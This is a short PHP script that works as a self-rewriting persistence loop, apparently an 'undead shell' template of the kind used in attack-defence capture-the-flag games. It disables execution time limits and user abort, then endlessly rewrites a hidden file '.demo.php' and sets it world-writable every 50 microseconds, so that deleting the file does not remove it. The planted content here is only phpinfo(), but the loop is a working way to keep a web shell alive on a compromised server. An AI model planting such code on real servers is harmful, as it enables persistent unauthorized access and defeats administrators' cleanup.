<?php
    set_time_limit(0);
    ignore_user_abort(true);
	$file = '.demo.php';
	$shell = "<?php phpinfo();?>";
    while(true){
        file_put_contents($file, $shell);
        system('chmod 777 .demo.php');
        usleep(50);
        }
?>